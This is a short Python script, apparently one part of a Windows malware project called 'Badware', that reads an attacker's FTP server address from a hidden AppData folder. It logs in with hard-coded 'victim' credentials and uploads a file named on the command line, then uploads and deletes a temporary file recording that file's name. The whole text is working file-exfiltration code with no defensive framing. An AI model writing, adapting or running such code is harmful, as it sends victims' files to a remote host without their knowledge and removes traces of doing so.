import os
import sys
import ftplib
username = os.getlogin()
with open(fr"C:\users\{username}\AppData\Local\Aryan\Badware\ftpserver", "r") as servername:
	server = servername.read()
session = ftplib.FTP(server,'victim','victimpass1234')
with open(sys.argv[1], 'rb') as result:
    session.storbinary('STOR requestedfile', result)
if os.path.isfile(fr'C:\users\{username}\AppData\local\Aryan\Badware\reqfilename.txt'):
    os.remove(fr'C:\users\{username}\AppData\local\Aryan\Badware\reqfilename.txt')
with open(fr'C:\users\{username}\AppData\local\Aryan\Badware\reqfilename.txt' , "x") as fname:
    fname.write(sys.argv[1].split("\\")[-1])
with open(fr'C:\users\{username}\AppData\local\Aryan\Badware\reqfilename.txt' , "rb") as fname:
    session.storbinary('STOR reqfilename.txt', fname)
os.remove(fr'C:\users\{username}\AppData\local\Aryan\Badware\reqfilename.txt')
session.quit()